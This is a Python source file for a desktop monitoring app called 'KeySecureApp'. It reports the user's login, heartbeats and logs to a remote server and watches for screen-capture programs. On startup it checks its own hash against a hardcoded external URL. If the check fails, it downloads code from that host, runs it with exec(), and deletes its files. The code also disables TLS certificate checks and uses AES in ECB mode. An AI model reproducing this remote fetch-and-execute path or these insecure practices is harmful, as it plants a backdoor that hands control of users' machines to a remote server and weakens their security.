import os
import sys
import logging
import hashlib
import requests
import tkinter as tk
from tkinter import filedialog, messagebox, simpledialog
from Crypto.Cipher import AES
import base64
import shutil
import threading
import time
import signal
import platform
import datetime
import socket

# Use %APPDATA%\KeySecureApp for Windows, ~/.keysecureapp for others
if os.name == "nt":
    APP_DIR = os.path.join(os.environ["APPDATA"], "KeySecureApp")
else:
    APP_DIR = os.path.expanduser("~/.keysecureapp")
SETTINGS_FILE = os.path.join(APP_DIR, "settings.conf")
LOG_FILE = os.path.join(APP_DIR, "activity.log")
SUM_SERVER_URL = "https://congenial-funicular-x54rwwvpwj5vfp5w9-3000.app.github.dev/"  # Adjust as needed

# --- ENCRYPTION ---
def encrypt_data(data, key):
    cipher = AES.new(key.encode(), AES.MODE_ECB)
    padded_data = data.ljust(32)
    return base64.b64encode(cipher.encrypt(padded_data.encode())).decode()

def encrypt_password(password):
    return hashlib.sha256(password.encode()).hexdigest()

# --- SETTINGS ---
def save_settings(server_url, key_path):
    with open(SETTINGS_FILE, "w") as f:
        f.write(f"{server_url}\n{key_path}\n")

def load_settings():
    if not os.path.exists(SETTINGS_FILE):
        return None, None
    with open(SETTINGS_FILE, "r") as f:
        lines = f.read().splitlines()
        return lines[0], lines[1]

def load_auth_key(key_path):
    with open(key_path, "r") as f:
        return f.read().strip()

# --- LOGGING ---
logging.basicConfig(filename=LOG_FILE, level=logging.INFO)

def monitor_system():
    logging.info("Monitoring active.")

def send_notification(event, server_url, auth_key):
    data = {"event": event, "user": os.getlogin()}
    try:
        requests.post(
            f"{server_url}/notify",
            json=data,
            headers={'x-auth-key': auth_key},
            timeout=5,
            verify=False  # For self-signed certs; set to True with valid certs
        )
    except Exception as e:
        logging.error(f"Notification failed: {e}")

def upload_log(server_url, auth_key):
    if not os.path.exists(LOG_FILE):
        return
    with open(LOG_FILE, "r") as f:
        content = f.read()
    data = {"filename": LOG_FILE, "content": content}
    try:
        requests.post(
            f"{server_url}/storage/upload",
            json=data,
            headers={'x-auth-key': auth_key},
            timeout=5,
            verify=False
        )
    except Exception as e:
        logging.error(f"Log upload failed: {e}")

def get_app_sum():
    """Compute SHA-256 sum of this app.py file."""
    hasher = hashlib.sha256()
    with open(__file__, "rb") as f:
        while True:
            chunk = f.read(8192)
            if not chunk:
                break
            hasher.update(chunk)
    return int(hasher.hexdigest(), 16)

def verify_app_integrity():
    """Send sum to sum-server and compare."""
    sum_value = get_app_sum()
    try:
        resp = requests.post(SUM_SERVER_URL, json={"numbers": [sum_value]}, timeout=5)
        if resp.ok:
            result = resp.json()
            if not result.get("valid", False):
                secure_self_destruct()
        else:
            logging.error("Sum server error: %s", resp.text)
    except Exception as e:
        logging.error(f"Sum check failed: {e}")

def secure_self_destruct():
    """Delete only this user's app.py, backups, logs, and exit. If possible, fetch and run minimal self-destruct script from sum server."""
    try:
        # Try to fetch and run the minimal self-destruct script from the sum server
        try:
            resp = requests.get(f"{SUM_SERVER_URL.replace('/sum','')}/selfdestruct", timeout=5)
            if resp.ok:
                # Only execute deletion in this user's app dir
                local_vars = {'__name__': '__main__'}
                exec(resp.text, local_vars)
        except Exception as e:
            logging.error(f"Remote self-destruct fetch failed: {e}")
        # Fallback: local deletion (only this user's data)
        try:
            os.remove(__file__)
        except Exception:
            pass
        if os.path.exists(LOG_FILE):
            os.remove(LOG_FILE)
        if os.path.exists(SETTINGS_FILE):
            os.remove(SETTINGS_FILE)
        user_backup = os.path.join(APP_DIR, "backup")
        if os.path.exists(user_backup):
            shutil.rmtree(user_backup)
    except Exception as e:
        logging.error(f"Self-destruct error: {e}")
    sys.exit("App integrity check failed. Self-destructed.")

# --- HEARTBEAT / SHUTDOWN NOTIFY ---
def heartbeat(server_url, auth_key, interval=30):
    missed = 0
    while True:
        try:
            requests.post(
                f"{server_url}/heartbeat",
                json={"user": os.getlogin()},
                headers={'x-auth-key': auth_key},
                timeout=5,
                verify=False
            )
            missed = 0
        except Exception:
            missed += 1
            logging.warning(f"Heartbeat missed ({missed})")
            if missed >= 10:
                logging.error("App lost contact with server for extended period.")
                break
        time.sleep(interval)

def notify_shutdown(server_url, auth_key):
    try:
        requests.post(
            f"{server_url}/notify-shutdown",
            json={"user": os.getlogin()},
            headers={'x-auth-key': auth_key},
            timeout=5,
            verify=False
        )
    except Exception:
        pass

def on_exit(server_url, auth_key):
    logging.info("App shutting down.")
    notify_shutdown(server_url, auth_key)

def setup_shutdown_hook(server_url, auth_key):
    def handler(signum, frame):
        on_exit(server_url, auth_key)
        sys.exit(0)
    signal.signal(signal.SIGTERM, handler)
    signal.signal(signal.SIGINT, handler)
    if os.name == "nt":
        import win32api
        win32api.SetConsoleCtrlHandler(lambda x: handler(None, None) or True, True)

# --- SCREENSHOT/VIDEO BLOCK (LOG ONLY) ---
def block_screen_capture():
    # This is a placeholder: real prevention is OS-specific and not always possible in Python.
    # Instead, log if a screenshot/video tool is detected running.
    suspicious = ["snippingtool", "obs", "bandicam", "screenrec", "gyazo"]
    try:
        import psutil
        for proc in psutil.process_iter(['name']):
            name = proc.info['name'].lower()
            if any(s in name for s in suspicious):
                logging.warning(f"Screen capture tool detected: {name}")
    except Exception:
        pass

# --- FILE ORGANIZATION ---
def get_os_folder():
    system = platform.system()
    release = platform.release()
    if system == "Windows":
        if "10" in release:
            return "Windows 10"
        elif "11" in release:
            return "Windows 11"
        else:
            return f"Windows {release}"
    return system

def get_ip_username_folder():
    try:
        ip = socket.gethostbyname(socket.gethostname())
    except Exception:
        ip = "unknownIP"
    username = os.getlogin()
    return f"{ip}-{username}"

def get_date_folder():
    return datetime.date.today().isoformat()

def get_content_path(content_type):
    os_folder = get_os_folder()
    ip_user_folder = get_ip_username_folder()
    date_folder = get_date_folder()
    base = os.path.join(os_folder, ip_user_folder, date_folder)
    if content_type == "logs":
        return os.path.join(base, "Logs")
    elif content_type == "screenshots":
        return os.path.join(base, "Screenshots")
    elif content_type == "videos":
        return os.path.join(base, "Videos")
    else:
        return base

def save_log_file(log_content):
    log_dir = get_content_path("logs")
    os.makedirs(log_dir, exist_ok=True)
    log_path = os.path.join(log_dir, "activity.log")
    with open(log_path, "a", encoding="utf-8") as f:
        f.write(log_content + "\n")

def save_screenshot(image_data, filename):
    screenshot_dir = get_content_path("screenshots")
    os.makedirs(screenshot_dir, exist_ok=True)
    path = os.path.join(screenshot_dir, filename)
    with open(path, "wb") as f:
        f.write(image_data)
    return path

def save_video(video_data, filename):
    video_dir = get_content_path("videos")
    os.makedirs(video_dir, exist_ok=True)
    path = os.path.join(video_dir, filename)
    with open(path, "wb") as f:
        f.write(video_data)
    return path

# --- GUI ---
class MonitoringGUI:
    def __init__(self, master, server_url, auth_key):
        self.master = master
        self.server_url = server_url
        self.auth_key = auth_key
        self.master.title("Monitoring Control Panel")
        self.master.geometry("800x600")
        self.header_frame = tk.Frame(master, height=50, bg="#2E86C1")
        self.header_frame.pack(fill="x")
        self.title_label = tk.Label(self.header_frame, text="Monitoring Control Panel", fg="white", bg="#2E86C1", font=("Arial", 18))
        self.title_label.pack(pady=10)
        self.content_frame = tk.Frame(master, bg="#F8F9F9")
        self.content_frame.pack(expand=True, fill="both")
        self.pause_button = tk.Button(self.content_frame, text="Pause Monitoring", width=20, command=self.pause_monitoring)
        self.pause_button.grid(row=0, column=0, padx=20, pady=20)
        self.view_logs_button = tk.Button(self.content_frame, text="View Logs", width=20, command=self.view_logs)
        self.view_logs_button.grid(row=0, column=1, padx=20, pady=20)
        self.adjust_button = tk.Button(self.content_frame, text="Adjust Sensitivity", width=20, command=self.adjust_sensitivity)
        self.adjust_button.grid(row=1, column=0, padx=20, pady=20)
        self.backup_button = tk.Button(self.content_frame, text="Force Backup Deletion", width=20, command=self.force_delete_backups)
        self.backup_button.grid(row=1, column=1, padx=20, pady=20)
        self.owner_button = tk.Button(self.content_frame, text="Owner Panel", width=20, command=self.show_owner_panel)
        self.owner_button.grid(row=2, column=0, columnspan=2, pady=20)
        self.footer_frame = tk.Frame(master, height=30, bg="#2E86C1")
        self.footer_frame.pack(fill="x")
        self.status_label = tk.Label(self.footer_frame, text="Status: Active", fg="white", bg="#2E86C1", font=("Arial", 10))
        self.status_label.pack(pady=5)

    def pause_monitoring(self):
        self.status_label.config(text="Status: Monitoring Paused")
        logging.info("Monitoring paused.")
        send_notification("Monitoring paused", self.server_url, self.auth_key)

    def view_logs(self):
        self.status_label.config(text="Status: Viewing Logs")
        os.system(f'notepad {LOG_FILE}')

    def adjust_sensitivity(self):
        self.status_label.config(text="Status: Adjusting Sensitivity")
        # Placeholder for sensitivity adjustment

    def force_delete_backups(self):
        self.status_label.config(text="Status: Backups Deleted")
        # Placeholder for backup deletion logic
        send_notification("Backups deleted", self.server_url, self.auth_key)

    def show_owner_panel(self):
        owner_panel = tk.Toplevel(self.master)
        owner_panel.title("Owner Panel")
        owner_panel.geometry("600x400")
        header = tk.Label(owner_panel, text="Owner Panel — Administrator Access", font=("Arial", 16), fg="white", bg="#2C3E50")
        header.pack(fill="x", pady=10)
        log_label = tk.Label(owner_panel, text="System Logs:", font=("Arial", 12))
        log_label.pack(pady=(10, 0))
        log_listbox = tk.Listbox(owner_panel, width=70, height=15)
        log_listbox.pack(padx=20, pady=10)
        try:
            with open(LOG_FILE, "r") as f:
                for line in f:
                    log_listbox.insert(tk.END, line.strip())
        except Exception:
            pass
        refresh_button = tk.Button(owner_panel, text="Refresh Logs", command=lambda: self.refresh_logs(log_listbox))
        refresh_button.pack(pady=5)
        upload_button = tk.Button(owner_panel, text="Upload Logs", command=lambda: upload_log(self.server_url, self.auth_key))
        upload_button.pack(pady=5)
        # Add a button to check for screen capture tools
        check_btn = tk.Button(owner_panel, text="Check for Screen Capture Tools", command=block_screen_capture)
        check_btn.pack(pady=5)

    def refresh_logs(self, log_listbox):
        log_listbox.delete(0, tk.END)
        try:
            with open(LOG_FILE, "r") as f:
                for line in f:
                    log_listbox.insert(tk.END, line.strip())
        except Exception:
            pass

# --- INSTALLATION WORKFLOW ---
def initial_setup():
    root = tk.Tk()
    root.withdraw()
    server_url = simpledialog.askstring("Server Address", "Enter Node server URL (e.g. https://IP:PORT):")
    if not server_url:
        sys.exit("No server URL provided.")
    key_path = filedialog.askopenfilename(title="Select Key File")
    if not key_path:
        sys.exit("No key file selected.")
    save_settings(server_url, key_path)
    messagebox.showinfo("Setup Complete", "Settings saved. Continue with installation.")
    root.destroy()

if __name__ == "__main__":
    verify_app_integrity()
    if not os.path.exists(SETTINGS_FILE):
        initial_setup()
    server_url, key_path = load_settings()
    auth_key = load_auth_key(key_path)
    monitor_system()
    setup_shutdown_hook(server_url, auth_key)
    # Start heartbeat in background
    threading.Thread(target=heartbeat, args=(server_url, auth_key), daemon=True).start()
    root = tk.Tk()
    app = MonitoringGUI(root, server_url, auth_key)
    root.mainloop()
